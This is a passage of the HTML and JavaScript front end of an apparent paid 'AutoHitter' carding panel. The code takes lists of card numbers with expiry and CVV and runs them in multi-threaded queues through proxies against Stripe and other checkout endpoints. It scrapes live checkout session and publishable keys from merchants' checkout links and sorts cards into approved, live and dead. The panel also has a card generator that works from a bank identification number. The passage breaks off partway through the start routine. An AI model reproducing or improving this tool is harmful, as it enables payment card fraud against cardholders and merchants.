            <button id="cfgSave" class="px-4 py-2 rounded-lg btn-primary text-sm hidden">Save & Apply</button>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- sounds -->
<audio id="approvedSound" src="/assets/sounds/charge.mp3"></audio>
<audio id="liveSound" src="/assets/sounds/live.mp3"></audio>

<!-- ==========================
     SECTION 10: MAIN SCRIPT (JS)
=========================== -->
<script>
(() => {
  // ------------------------------
  // SECTION 10.1: HELPERS
  // ------------------------------
  const $   = sel => document.querySelector(sel);
  const byId = id => document.getElementById(id);

  const toast = (msg, type = 'info') => {
    Swal.fire({
      toast: true,
      position: 'top-end',
      showConfirmButton: false,
      timer: 2600,
      icon: type,
      title: msg,
      background: 'rgba(2,6,23,.95)',
      color: '#fff',
      iconColor: '#34d399'
    });
  };

  const esc = (s) => String(s ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');

  // Hit toast
  const hitToast = (resp, type = 'success') => {
    const txt = String(resp ?? '').trim();
    Swal.fire({
      toast: true,
      position: 'top-end',
      showConfirmButton: false,
      timer: 2600,
      icon: type,
      title: 'Hit Detected !',
      html: `<div class="text-[13px] leading-snug">${esc(txt)}</div>`,
      background: 'rgba(2,6,23,.95)',
      color: '#fff',
      iconColor: type === 'success' ? '#34d399' : '#60a5fa'
    });
  };

  // ------------------------------
  // SECTION 10.2: PROGRESS BAR
  // ------------------------------
  const $pWrap = byId('progressWrap');
  const $pBar  = byId('progressBar');
  const $pText = byId('progressText');
  let P_TOTAL = 0, P_DONE = 0;

  function initProgress(total) {
    P_TOTAL = total;
    P_DONE  = 0;
    if ($pWrap && $pText) {
      $pWrap.classList.remove('hidden');
      $pText.classList.remove('hidden');
      $pBar.style.width = '0%';
      $pText.textContent = `0% • 0/${P_TOTAL}`;
    }
  }

  function tickProgress() {
    P_DONE = Math.min(P_DONE + 1, P_TOTAL);
    const pct = P_TOTAL ? Math.round((P_DONE / P_TOTAL) * 100) : 0;
    if ($pBar && $pText) {
      $pBar.style.width = pct + '%';
      $pText.textContent = `${pct}% • ${P_DONE}/${P_TOTAL}`;
      if (P_DONE >= P_TOTAL) {
        $pWrap.classList.add('hidden');
        $pText.classList.add('hidden');
      }
    }
  }

  // ------------------------------
  // SECTION 10.3: LOCALSTORAGE KEYS
  // ------------------------------
  const CFG_KEY         = 'cx_cfg_v2';
  const BLUR_KEY        = 'cx_blur_mode_v1';
  const ACK_KEY         = 'cx_ack_credits_v1';
  const URLS_LS_KEY     = 'cx_input_urls_v1';
  const SPEED_STATE_KEY = 'cx_speed_state_v1';

  // ------------------------------
  // SECTION 10.4: BLUR MODE
  // ------------------------------
  function setBlur(on, persist = true) {
    const root = byId('mainRoot');
    if (root) root.classList.toggle('blur-mode', !!on);

    const cfgBlurSwitch = byId('cfgBlurSwitch');
    if (cfgBlurSwitch) cfgBlurSwitch.checked = !!on;

    const pageSwitch = byId('blurSwitch'); // (if you ever add a page-level toggle)
    if (pageSwitch) pageSwitch.checked = !!on;

    if (persist) {
      try { localStorage.setItem(BLUR_KEY, on ? '1' : '0'); } catch {}
    }
  }

  try {
    const saved = localStorage.getItem(BLUR_KEY);
    if (saved === '1') setBlur(true, false);
    else if (saved === '0') setBlur(false, false);
  } catch {}

  // ------------------------------
  // SECTION 10.5: CONFIG SAVE/LOAD
  // ------------------------------
  function saveCurrentCfg() {
    const obj = {
      gateway:           byId('gateway')?.value || '',
      api:               byId('api')?.value || '',
      proxyOn:           !!byId('proxySwitch')?.checked,
      proxyVal:          byId('proxySelect')?.value || 'random',
      stripeClientSecret:byId('stripeClientSecret')?.value || '',
      stripePkKey:       byId('stripePkKey')?.value || '',
      stripeAcct:        byId('stripeAcct')?.value || '',
      checkoutLinkInput: byId('checkoutLinkInput')?.value || '',
      cs_live:           byId('cs_live')?.value || '',
      pk_live:           byId('pk_live')?.value || '',
      checkout_email:    byId('checkout_email')?.value || '',
      checkout_amount:   byId('checkout_amount')?.value || ''
    };
    try {
      localStorage.setItem(CFG_KEY, JSON.stringify(obj));
    } catch (e) {
      console.error('Failed to save configuration:', e);
    }
  }

  function loadCfg() {
    try {
      const raw = localStorage.getItem(CFG_KEY);
      return raw ? JSON.parse(raw) : null;
    } catch (e) {
      console.error('Failed to load configuration:', e);
      return null;
    }
  }

  // NOTE: Important fix vs your previous code:
  // we update the GLOBAL CFG_OK instead of shadowing it.
  let CFG_OK = false;

  function applyCfg(cfg, notify = false) {
    if (!cfg || !cfg.gateway) return false;

    const $gateway = byId('gateway');
    const $api     = byId('api');

    if ($gateway) $gateway.value = cfg.gateway;
    updateApiOptions();   // rebuild api list
    if ($api && cfg.api) $api.value = cfg.api;

    const selectedApi = apiMap[$gateway?.value]?.apis.find(a => a.value === $api?.value);
    setApiPill(selectedApi);
    toggleAuxInputs($gateway?.value, $api?.value);

    const $statGateway = byId('statGateway');
    if ($statGateway) $statGateway.textContent = selectedApi?.label || 'Select API';

    const $proxySw = byId('proxySwitch');
    if ($proxySw) $proxySw.checked = !!cfg.proxyOn;

    const $proxySelectContainer = byId('proxySelectContainer');
    if ($proxySelectContainer) $proxySelectContainer.classList.toggle('hidden', !$proxySw?.checked);

    const $proxySelect = byId('proxySelect');
    if ($proxySelect && cfg.proxyVal) $proxySelect.value = cfg.proxyVal;

    const $stripeClientSecret = byId('stripeClientSecret');
    if ($stripeClientSecret) $stripeClientSecret.value = cfg.stripeClientSecret || '';

    const $stripePkKey = byId('stripePkKey');
    if ($stripePkKey) $stripePkKey.value = cfg.stripePkKey || '';

    const $stripeAcct = byId('stripeAcct');
    if ($stripeAcct) $stripeAcct.value = cfg.stripeAcct || '';

    const $checkoutLinkInput = byId('checkoutLinkInput');
    if ($checkoutLinkInput) $checkoutLinkInput.value = cfg.checkoutLinkInput || '';

    const $cs_live = byId('cs_live');
    if ($cs_live) $cs_live.value = cfg.cs_live || '';

    const $pk_live = byId('pk_live');
    if ($pk_live) $pk_live.value = cfg.pk_live || '';

    const $checkout_email = byId('checkout_email');
    if ($checkout_email) $checkout_email.value = cfg.checkout_email || '';

    const $checkout_amount = byId('checkout_amount');
    if ($checkout_amount) $checkout_amount.value = cfg.checkout_amount || '';

    // <-- This line is the key: update global CFG_OK
    CFG_OK = !!($gateway?.value && $api?.value);

    const $start = byId('btnStart');
    if ($start) $start.disabled = !CFG_OK;

    if (notify) toast('Configuration restored', 'success');
    return true;
  }

  // ------------------------------
  // SECTION 10.6: DOM ELEMENT SHORTCUTS
  // ------------------------------
  const $gateway   = byId('gateway');
  const $api       = byId('api');
  const $proxySw   = byId('proxySwitch');
  const $proxySelectContainer = byId('proxySelectContainer');
  const $proxySelect          = byId('proxySelect');
  const $file      = byId('fileInput');
  const $txt       = byId('cardList');
  const $start     = byId('btnStart');
  const $stop      = byId('btnStop');
  const $clear     = byId('btnClear');

  const $boxApproved = byId('approvedBox');
  const $boxLive     = byId('liveBox');
  const $boxDead     = byId('deadBox');

  const $statTotal    = byId('statTotal');
  const $statApproved = byId('statApproved');
  const $statLive     = byId('statLive');
  const $statDead     = byId('statDead');
  const $statYet      = byId('statYet');
  const $statCred     = byId('statCred');
  const $statGateway  = byId('statGateway');

  const $tabApproved  = byId('tabApproved');
  const $tabLive      = byId('tabLive');
  const $tabDead      = byId('tabDead');
  const $panelApproved= byId('panelApproved');
  const $panelLive    = byId('panelLive');
  const $panelDead    = byId('panelDead');

  const $urlInputContainer          = byId('urlInputContainer');
  const $urlInput                   = byId('urlInput');
  const $stripeInputContainer       = byId('stripeInputContainer');
  const $stripeClientSecret         = byId('stripeClientSecret');
  const $stripePkKey                = byId('stripePkKey');
  const $stripeAcct                 = byId('stripeAcct');
  const $stripeCheckoutInputContainer = byId('stripeCheckoutInputContainer');
  const $checkoutLinkInput          = byId('checkoutLinkInput');
  const $grabCsPkBtn                = byId('grabCsPkBtn');
  const $cs_live                    = byId('cs_live');
  const $pk_live                    = byId('pk_live');
  const $checkout_email             = byId('checkout_email');
  const $checkout_amount            = byId('checkout_amount');
  const $apiLockHint                = byId('apiLockHint');

  const $genbin   = byId('genbin');
  const $genqty   = byId('genqty');
  const $gencvv   = byId('gencvv');
  const $month    = byId('month');
  const $year     = byId('year');
  const $btnGen   = byId('btnGen');

  const $cfgModal = byId('cfgModal');
  const $cfgSheet = $cfgModal?.querySelector('.sheet');
  const $cfgNext  = byId('cfgNext');
  const $cfgBack  = byId('cfgBack');
  const $cfgSave  = byId('cfgSave');
  const $cfgCancel= byId('cfgCancel');
  const $cfgProxySwitch = byId('cfgProxySwitch');
  const $cfgProxySelect = byId('cfgProxySelect');
  const $cfgProxyWrap   = byId('cfgProxySelectWrap');
  const $cfgBlurSwitch  = byId('cfgBlurSwitch');
  const $cfgResetAllBtn = byId('cfgResetAllBtn');
  const $openCfgBtn     = byId('openCfgBtn');

  const $openToolsBtn = byId('openToolsBtn');
  const $toolsModal   = byId('toolsModal');
  const $toolsSheet   = byId('toolsSheet');
  const $toolsClose   = byId('toolsClose');

  const $creditsModal = byId('creditsModal');
  const $creditsCard  = byId('creditsCard');
  const $ackBtn       = byId('ackBtn');

  const $copyApproved = byId('copyApproved');
  const $copyLive     = byId('copyLive');
  const $clearDead    = byId('clearDead');

  // ------------------------------
  // SECTION 10.7: SPEED TRACKER
  // ------------------------------
  const speed = {
    n: 0,
    sumMs: 0,
    reset() {
      this.n = 0;
      this.sumMs = 0;
      updateAvg();
      saveSpeed();
    }
  };
  const speedByApi = {};

  function saveSpeed() {
    try {
      localStorage.setItem(SPEED_STATE_KEY, JSON.stringify({ n: speed.n, sumMs: speed.sumMs }));
    } catch {}
  }

  function loadSpeed() {
    try {
      const raw = localStorage.getItem(SPEED_STATE_KEY);
      if (!raw) return;
      const s = JSON.parse(raw);
      if (s && typeof s.n === 'number' && typeof s.sumMs === 'number') {
        speed.n = s.n;
        speed.sumMs = s.sumMs;
        updateAvg();
      }
    } catch {}
  }

  function addSample(apiLabel, ms) {
    speed.n++;
    speed.sumMs += ms;
    updateAvg();
    saveSpeed();
    (speedByApi[apiLabel] ??= { n: 0, sumMs: 0 });
    speedByApi[apiLabel].n++;
    speedByApi[apiLabel].sumMs += ms;
    renderApiSpeeds();
  }

  function updateAvg() {
    const el = byId('statSpeed');
    if (el) el.textContent = speed.n
      ? ((speed.sumMs / speed.n / 1000).toFixed(2) + ' s')
      : '—';
  }

  function renderApiSpeeds() {
    const ul = byId('apiSpeedList');
    if (!ul) return;
    ul.innerHTML = Object.entries(speedByApi)
      .map(([name, v]) =>
        `<li class="flex justify-between"><span>${name}</span><span>${(v.sumMs / v.n / 1000).toFixed(2)} s</span></li>`
      )
      .join('');
  }

  loadSpeed();

  // restore saved URLs (Checkout)
  try {
    const savedUrls = localStorage.getItem(URLS_LS_KEY);
    if (savedUrls && $urlInput) $urlInput.value = savedUrls;
  } catch {}

  if ($urlInput) $urlInput.addEventListener('input', () => {
    try {
      localStorage.setItem(URLS_LS_KEY, ($urlInput.value || '').replace(/\r/g, '').trim());
    } catch {}
  });

  // ------------------------------
  // SECTION 10.8: STRIPE CHECKOUT CS/PK GRABBER
  // ------------------------------
  if ($grabCsPkBtn && $checkoutLinkInput && $cs_live && $pk_live && $checkout_email && $checkout_amount) {
    $grabCsPkBtn.addEventListener('click', async () => {
      const link = $checkoutLinkInput.value.trim();
      if (!link) {
        toast('Please enter Stripe Checkout link', 'warning');
        return;
      }
      if (!link.includes('cs_live')) {
        toast('Invalid Stripe Checkout link', 'warning');
        return;
      }
      $grabCsPkBtn.disabled = true;
      $grabCsPkBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Grabbing...';
      try {
        const params = new URLSearchParams();
        params.append('checkoutlink', link);
        const res = await fetch('/api/autohitter/cspkgrabber.php', {
          method: 'POST',
          body: params
        });
        if (!res.ok) throw new Error('API error');
        const data = await res.json();
        if (data.cslive && data.pklive) {
          $cs_live.value         = data.cslive;
          $pk_live.value         = data.pklive;
          $checkout_email.value  = decodeURIComponent(data.email || '');
          $checkout_amount.value = data.amount || '';
          saveCurrentCfg();
          toast('✅ CS/PK grabbed successfully!', 'success');
        } else {
          throw new Error(data.error || 'Invalid response');
        }
      } catch (e) {
        toast(`❌ Failed: ${e.message}`, 'error');
      } finally {
        $grabCsPkBtn.disabled = false;
        $grabCsPkBtn.innerHTML = '<i class="fas fa-magic mr-2"></i>Grab CS/PK';
      }
    });
  }

  // ------------------------------
  // SECTION 10.9: CONFIG MODAL (STEPS)
  // ------------------------------
  let STEP = 1;
  let cfg  = { gateway: '', api: '' }; // used by modal only

  function stepUI() {
    ['step1', 'step2', 'step3'].forEach((id, i) => {
      const el   = document.getElementById(id);
      const step = document.getElementById('s' + (i + 1));
      if (el)   el.classList.toggle('hidden', STEP !== (i + 1));
      if (step) step.classList.toggle('on',    STEP === (i + 1));
    });
    if ($cfgBack) $cfgBack.classList.toggle('hidden', STEP === 1);
    if ($cfgNext) $cfgNext.classList.toggle('hidden', STEP === 3);
    if ($cfgSave) $cfgSave.classList.toggle('hidden', STEP !== 3);
  }

  function openCfg() {
    if (!$cfgModal || !$cfgSheet) return;

    STEP = 1;
    stepUI();

    cfg.gateway = $gateway?.value || '';
    cfg.api     = $api?.value || '';

    buildGatewayList();
    buildApiList();

    if ($cfgProxySwitch) $cfgProxySwitch.checked = $proxySw?.checked || false;
    if ($cfgProxyWrap)   $cfgProxyWrap.classList.toggle('hidden', !$cfgProxySwitch?.checked);
    if ($cfgProxySelect) $cfgProxySelect.value = ($proxySelect?.value || 'random');

    try {
      if ($cfgBlurSwitch) $cfgBlurSwitch.checked = (localStorage.getItem(BLUR_KEY) === '1');
    } catch {
      if ($cfgBlurSwitch) $cfgBlurSwitch.checked = false;
    }

    $cfgModal.classList.remove('hidden');
    requestAnimationFrame(() => {
      $cfgSheet.classList.remove('translate-y-4', 'opacity-0');
      $cfgSheet.classList.add('translate-y-0', 'opacity-100');
    });
  }

  function closeCfg() {
    if (!$cfgSheet) return;
    $cfgSheet.classList.add('translate-y-4', 'opacity-0');
    setTimeout(() => {
      if ($cfgModal) $cfgModal.classList.add('hidden');
    }, 180);
  }

  function resetAllSaved() {
    try {
      const toRemove = [];
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        if (k && k.startsWith('cx_')) toRemove.push(k);
      }
      toRemove.forEach(k => localStorage.removeItem(k));
    } catch {}

    if ($urlInput)  $urlInput.value = '';
    if ($proxySw)   $proxySw.checked = false;
    if ($proxySelectContainer) $proxySelectContainer.classList.add('hidden');
    if ($proxySelect)          $proxySelect.value = 'random';

    if ($gateway) $gateway.value = '';
    if ($api)     $api.innerHTML = '';
    if ($apiLockHint) $apiLockHint.classList.add('hidden');

    if ($stripeClientSecret) $stripeClientSecret.value = '';
    if ($stripePkKey)        $stripePkKey.value = '';
    if ($stripeAcct)         $stripeAcct.value = '';
    if ($checkoutLinkInput)  $checkoutLinkInput.value = '';
    if ($cs_live)            $cs_live.value = '';
    if ($pk_live)            $pk_live.value = '';
    if ($checkout_email)     $checkout_email.value = '';
    if ($checkout_amount)    $checkout_amount.value = '';

    CFG_OK = false;
    if ($start) $start.disabled = true;
    if ($statGateway) $statGateway.textContent = 'Select API';

    setBlur(false, false);
    toast('All saved data cleared', 'success');
  }

  if ($cfgResetAllBtn) $cfgResetAllBtn.addEventListener('click', resetAllSaved);

  // ------------------------------
  // SECTION 10.10: GATEWAY / API MAP (AUTOHITTERS)
  // ------------------------------
  const GW_ICONS = { checkout: '💳', stripe: '💸' };

  // Only AutoHitters endpoints here
  const USER_ROLE = '<?= htmlspecialchars($status, ENT_QUOTES, "UTF-8") ?>';
  const roleLevel = r => ({ free: 1, premium: 2, admin: 3 })[r] || 1;
  const canUse    = (minRole = 'free') => roleLevel(USER_ROLE) >= roleLevel(minRole);

  const apiMap = {
    checkout: {
      label: 'Checkout',
      apis: [
        {
          value: 'paycheckout',
          label: 'PayCheckout Hitter',
          endpoint: '/api/autohitter/checkouthitter.php',
          credits: 5,
          minRole: 'free',
          alive: true
        }
      ]
    },
    stripe: {
      label: 'Stripe',
      apis: [
        {
          value: 'inbuilt_autohitter1',
          label: 'Inbuilt CCN AutoHitter',
          endpoint: '/api/autohitter/inbuiltccn.php',
          credits: 5,
          minRole: 'free',
          alive: true
        },
        {
          value: 'inbuilt_autohitter2',
          label: 'Inbuilt CVV AutoHitter',
          endpoint: '/api/autohitter/inbuiltcvv.php',
          credits: 5,
          minRole: 'free',
          alive: true
        },
        {
          value: 'stripe_checkout',
          label: 'Stripe Checkout Hitter',
          endpoint: '/api/autohitter/stripecheckout.php',
          credits: 5,
          minRole: 'free',
          alive: true
        }
      ]
    }
  };

  const proxyRequired = <?= $proxySet ? 'false' : 'true' ?>;
  const maxChecks     = <?= (int)$maxChecks ?>;

  // ------------------------------
  // SECTION 10.11: BUILD GATEWAY/API LISTS (MODAL)
  // ------------------------------
  function buildGatewayList() {
    const box = byId('gwList');
    if (!box) return;
    box.innerHTML = '';
    Object.keys(apiMap).forEach(key => {
      const label = apiMap[key].label;
      const li = document.createElement('div');
      li.className = 'fsel-item' + (cfg.gateway === key ? ' active' : '');
      li.innerHTML = `
        <div class="fsel-left">
          <div class="fsel-ico">${GW_ICONS[key] || '🗂️'}</div>
          <div>
            <div class="fsel-title">${label}</div>
            <div class="fsel-sub">${apiMap[key].apis.length} APIs available</div>
          </div>
        </div>
        <div class="fsel-right"><span class="badge-s">Select</span></div>`;
      li.addEventListener('click', () => {
        cfg.gateway = key;
        buildGatewayList();
        STEP = 2;
        buildApiList();
        stepUI();
      });
      box.appendChild(li);
    });
  }

  function buildApiList() {
    const wrap = byId('apiList');
    if (!wrap) return;
    wrap.innerHTML = '';
    if (!cfg.gateway) {
      wrap.innerHTML = '<div class="text-sm text-slate-400 text-center py-8">Choose a gateway first.</div>';
      return;
    }
    apiMap[cfg.gateway].apis.forEach(a => {
      const allowed = canUse(a.minRole || 'free');
      const li = document.createElement('div');
      li.className = 'fsel-item' + (cfg.api === a.value ? ' active' : '');
      li.style.opacity = (allowed && a.alive) ? '1' : '.55';
      li.innerHTML = `
        <div class="fsel-left">
          <div class="fsel-ico">🔌</div>
          <div>
            <div class="fsel-title">${a.label}</div>
            <div class="fsel-sub">${a.credits} credits • ${allowed ? 'Unlocked' : '🔒 Locked'} • ${a.value}</div>
          </div>
        </div>
        <div class="fsel-right">
          <span class="badge-s ${a.alive ? 'badge-ok' : 'badge-down'}">${a.alive ? 'Active' : 'Inactive'}</span>
        </div>`;
      if (allowed && a.alive) {
        li.addEventListener('click', () => {
          cfg.api = a.value;
          buildApiList();
        });
      }
      wrap.appendChild(li);
    });
  }

  // Step nav
  if ($cfgNext) $cfgNext.addEventListener('click', () => {
    if (STEP === 1 && !cfg.gateway) return toast('Select a gateway first', 'warning');
    if (STEP === 2 && !cfg.api)     return toast('Select an API', 'warning');
    STEP = Math.min(3, STEP + 1);
    stepUI();
  });
  if ($cfgBack) $cfgBack.addEventListener('click', () => {
    STEP = Math.max(1, STEP - 1);
    stepUI();
  });
  if ($cfgCancel) $cfgCancel.addEventListener('click', closeCfg);

  // Proxy toggles inside modal
  if ($cfgProxySwitch) $cfgProxySwitch.addEventListener('change', () => {
    if ($cfgProxyWrap) $cfgProxyWrap.classList.toggle('hidden', !$cfgProxySwitch.checked);
  });

  // Apply config from modal
  if ($cfgSave) $cfgSave.addEventListener('click', () => {
    if (!cfg.gateway || !cfg.api) {
      return toast('Select gateway & API', 'warning');
    }

    if ($gateway) $gateway.value = cfg.gateway;
    updateApiOptions();
    if ($api) $api.value = cfg.api;

    const selectedApi = apiMap[cfg.gateway]?.apis.find(a => a.value === cfg.api);
    setApiPill(selectedApi);
    toggleAuxInputs($gateway.value, $api.value);

    if ($statGateway) $statGateway.textContent = selectedApi?.label || 'Select API';

    if ($proxySw) $proxySw.checked = $cfgProxySwitch?.checked;
    if ($proxySelectContainer) $proxySelectContainer.classList.toggle('hidden', !$proxySw?.checked);
    if ($proxySelect) $proxySelect.value = $cfgProxySelect?.value || 'random';

    setBlur($cfgBlurSwitch?.checked);

    CFG_OK = !!($gateway.value && $api.value);
    if ($start) $start.disabled = !CFG_OK;

    saveCurrentCfg();
    closeCfg();
    toast('Configuration saved & applied', 'success');
  });

  if ($openCfgBtn) $openCfgBtn.addEventListener('click', openCfg);

  // ------------------------------
  // SECTION 10.12: API SELECT (INLINE DROPDOWN)
  // ------------------------------
  function toggleAuxInputs(gateway, apiVal) {
    if ($urlInputContainer)          $urlInputContainer.classList.add('hidden');
    if ($stripeInputContainer)       $stripeInputContainer.classList.add('hidden');
    if ($stripeCheckoutInputContainer) $stripeCheckoutInputContainer.classList.add('hidden');

    if (gateway === 'checkout' && apiVal === 'paycheckout') {
      if ($urlInputContainer) $urlInputContainer.classList.remove('hidden');
    } else if (gateway === 'stripe') {
      if (apiVal === 'inbuilt_autohitter1' || apiVal === 'inbuilt_autohitter2') {
        if ($stripeInputContainer) $stripeInputContainer.classList.remove('hidden');
      } else if (apiVal === 'stripe_checkout') {
        if ($stripeCheckoutInputContainer) $stripeCheckoutInputContainer.classList.remove('hidden');
      }
    }
  }

  function updateApiOptions() {
    if (!$gateway || !$api || !$apiLockHint) return;
    const gway = $gateway.value;
    $api.innerHTML = '<option value="">Select API</option>';
    $apiLockHint.classList.add('hidden');

    if (apiMap[gway]) {
      let firstAllowed = '';
      let anyLocked = false;
      apiMap[gway].apis.forEach(api => {
        const allowed = canUse(api.minRole || 'free');
        const option = document.createElement('option');
        option.value = api.value;
        const statusDot = api.alive ? '🟢' : '🔴';
        option.textContent = allowed
          ? `${statusDot} ${api.label}`
          : `${statusDot} ${api.label} 🔒`;
        option.disabled = !allowed || !api.alive;
        if (!allowed) anyLocked = true;
        $api.appendChild(option);
        if (allowed && api.alive && !firstAllowed) firstAllowed = api.value;
      });
      $api.value = firstAllowed || '';
      if (anyLocked && USER_ROLE === 'free') $apiLockHint.classList.remove('hidden');
    }

    const selectedApiVal = $api.value;
    const selectedApi    = apiMap[gway]?.apis.find(a => a.value === selectedApiVal);

    if ($statGateway) $statGateway.textContent = selectedApi?.label || 'Select API';
    setApiPill(selectedApi);
    toggleAuxInputs(gway, selectedApiVal);
  }

  if ($gateway) $gateway.addEventListener('change', () => {
    $api.classList.add('opacity-50', 'pointer-events-none');
    setTimeout(() => {
      updateApiOptions();
      $api.classList.remove('opacity-50', 'pointer-events-none');
    }, 200);
  });

  if ($api) $api.addEventListener('change', () => {
    const gway = $gateway.value;
    const apiVal = $api.value;
    const selectedApi = apiMap[gway]?.apis.find(a => a.value === apiVal);
    if ($statGateway) $statGateway.textContent = selectedApi?.label || 'Select API';
    setApiPill(selectedApi);
    toggleAuxInputs(gway, apiVal);
    saveCurrentCfg();
  });

  function setApiPill(apiObj) {
    const pill = byId('apiStatusPill');
    if (!pill) return;
    if (!apiObj) {
      pill.style.display = 'none';
      return;
    }
    pill.style.display = 'inline-flex';
    pill.textContent   = apiObj.alive ? 'Active' : 'Inactive';
    pill.classList.toggle('ok',   !!apiObj.alive);
    pill.classList.toggle('down', !apiObj.alive);
  }

  // Proxy switch inline
  if ($proxySw) $proxySw.addEventListener('change', () => {
    if ($proxySelectContainer) $proxySelectContainer.classList.toggle('hidden', !$proxySw.checked);
    saveCurrentCfg();
  });

  // ------------------------------
  // SECTION 10.13: TABS (RESULT PANELS)
  // ------------------------------
  function switchTab(which) {
    if (![$tabApproved, $tabLive, $tabDead].every(el => el) ||
        ![$panelApproved, $panelLive, $panelDead].every(el => el)) return;

    [$tabApproved, $tabLive, $tabDead].forEach(tab =>
      tab.classList.remove('ring-1', 'ring-emerald-400', 'bg-emerald-500/10')
    );
    [$panelApproved, $panelLive, $panelDead].forEach(panel =>
      panel.classList.add('hidden')
    );

    if (which === 'approved') {
      $tabApproved.classList.add('ring-1', 'ring-emerald-400', 'bg-emerald-500/10');
      $panelApproved.classList.remove('hidden');
    } else if (which === 'live') {
      $tabLive.classList.add('ring-1', 'ring-emerald-400', 'bg-emerald-500/10');
      $panelLive.classList.remove('hidden');
    } else {
      $tabDead.classList.add('ring-1', 'ring-emerald-400', 'bg-emerald-500/10');
      $panelDead.classList.remove('hidden');
    }
  }

  if ($tabApproved) $tabApproved.addEventListener('click', () => switchTab('approved'));
  if ($tabLive)     $tabLive.addEventListener('click', () => switchTab('live'));
  if ($tabDead)     $tabDead.addEventListener('click', () => switchTab('dead'));

  // ------------------------------
  // SECTION 10.14: FILE IMPORT + CLEAR ALL
  // ------------------------------
  if ($file) $file.addEventListener('change', function() {
    const f = this.files && this.files[0];
    if (!f) return;
    const fr = new FileReader();
    fr.onload = () => {
      if ($txt) {
        $txt.value = String(fr.result).replace(/\r/g, '').trim();
        toast('Cards imported successfully', 'success');
      }
      this.value = '';
    };
    fr.readAsText(f);
  });

  if ($clear) $clear.addEventListener('click', () => {
    if ($txt)           $txt.value = '';
    if ($boxApproved)   $boxApproved.innerHTML = '';
    if ($boxLive)       $boxLive.innerHTML = '';
    if ($boxDead)       $boxDead.innerHTML = '';
    if ($statTotal)     $statTotal.textContent = '0';
    if ($statApproved)  $statApproved.textContent = '0';
    if ($statLive)      $statLive.textContent = '0';
    if ($statDead)      $statDead.textContent = '0';
    if ($statYet)       $statYet.textContent = '0';
    if ($urlInput)      $urlInput.value = '';
    if ($stripeClientSecret) $stripeClientSecret.value = '';
    if ($stripePkKey)        $stripePkKey.value = '';
    if ($stripeAcct)         $stripeAcct.value = '';
    if ($checkoutLinkInput)  $checkoutLinkInput.value = '';
    if ($cs_live)            $cs_live.value = '';
    if ($pk_live)            $pk_live.value = '';
    if ($checkout_email)     $checkout_email.value = '';
    if ($checkout_amount)    $checkout_amount.value = '';
    saveCurrentCfg();
    toast('All data cleared', 'info');
  });

  // ------------------------------
  // SECTION 10.15: VALIDATORS / CLASSIFIER
  // ------------------------------
  function validateLine(l) {
    const p = l.split('|');
    return p.length === 4 &&
      /^[0-9]{13,19}$/.test(p[0]) &&
      /^[0-9]{1,2}$/.test(p[1]) &&
      /^[0-9]{2,4}$/.test(p[2]) &&
      /^[0-9]{3,4}$/.test(p[3]);
  }

  function validateUrl(url) {
    const urlPattern = /^(https?:\/\/)?([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(\/.*)?$/;
    return urlPattern.test(url.trim());
  }

  function classify(resp) {
    if (resp && typeof resp === 'object' && resp.status) {
      const status = resp.status.toLowerCase();
      if (status === 'charge' || status === 'approved') return 'APPROVED';
      if (status === 'live') return 'LIVE';
    }
    const t = String(resp || '').toUpperCase();
    if (t.includes('YOUR PAYMENT SUCCESSFUL') || t.includes('CHARGE') || t.includes('APPROVED')) return 'APPROVED';
    if (t.includes('LIVE') || t.includes('CVV2_FAILURE') || t.includes('INSUFFICIENT_FUNDS') || t.includes('CARD ISSUER DECLINED CVV')) return 'LIVE';
    return 'DEAD';
  }

  const gatewayLabel = (gateway, api) =>
    (apiMap[gateway]?.apis.find(a => a.value === api)?.label || 'Unknown');

  // ------------------------------
  // SECTION 10.16: HITTING ENGINE (MULTI-THREAD)
  // ------------------------------
  let running = false, aborter;

  async function worker(queue, ctx) {
    while (running && !aborter?.signal.aborted) {
      const next = queue.shift();
      if (!next) break;
      try {
        await ctx.runOne(next);
      } catch (e) {
        if (e.name === 'AbortError') break;
        console.error('Worker error:', e);
      }
    }
  }

  function stopRun() {
    running = false;
    if (aborter) aborter.abort();
    aborter = null;
    if ($start) {
      $start.disabled = false;
      $start.innerHTML = '<i class="fas fa-play mr-1"></i> Start Hitting';
    }
    if ($stop) $stop.disabled = true;
    toast('Hitting stopped', 'warning');
  }

  async function startRun() {
    if (running) return toast('Already running', 'warning');
    if (!CFG_OK) { toast('Configure gateway & API first', 'warning'); openCfg(); return; }

    const gateway = $gateway.value;
    const api     = $api.value;
    if (!gateway || !api) return toast('Select gateway & API', 'warning');

    const selectedApi = apiMap[gateway]?.apis.find(a => a.value === api);
    if (!selectedApi) return toast('API not found', 'error');
    if (!canUse(selectedApi.minRole || 'free')) return toast('API locked for your plan. Upgrade 🔒', 'error');
    if (proxyRequired && !$proxySw.checked) return toast('Proxy required!', 'warning');

    const haveCredits = parseInt($statCred.textContent || '0', 10);
    if (haveCredits < selectedApi.credits) {
      return toast(`Insufficient credits (${haveCredits}/${selectedApi.credits})`, 'error');
    }

    let lines = ($txt.value || '').replace(/\r/g, '').split(/\n+/)
      .map(s => s.trim()).filter(Boolean).filter(validateLine);

    if (!lines.length) return toast('No valid cards', 'warning');
    if (lines.length > maxChecks) return toast(`Max ${maxChecks} cards for your plan`, 'warning');

    // API-specific validation
    if (gateway === 'checkout' && api === 'paycheckout') {
      let urls = ($urlInput.value || '').replace(/\r/g, '').split(/\n+/)
        .map(s => s.trim()).filter(Boolean).filter(validateUrl);
      if (urls.length === 0)  return toast('Add at least 1 valid URL', 'warning');
      if (urls.length > 50)   return toast('Max 50 URLs', 'warning');
    } else if (gateway === 'stripe' && (api === 'inbuilt_autohitter1' || api === 'inbuilt_autohitter2')) {
      if (!$stripeClientSecret.value.trim() || !$stripePkKey.value.trim())
        return toast('Client Secret & PK Key required', 'warning');
    } else if (gateway === 'stripe' && api === 'stripe_checkout') {
      if (!$cs_live.value.trim() || !$pk_live.value.trim())
        return toast('Grab CS/PK first!', 'warning');
    }

    // Start hitting
    initProgress(lines.length);
    speed.reset();
    running = true;
    aborter = new AbortController();

    $start.disabled = true;
    $start.innerHTML = '<i class="fas fa-spinner fa-spin mr-1"></i> Hitting...';
    $stop.disabled = false;

    $boxApproved.innerHTML = '';
    $boxLive.innerHTML     = '';
    $boxDead.innerHTML     = '';

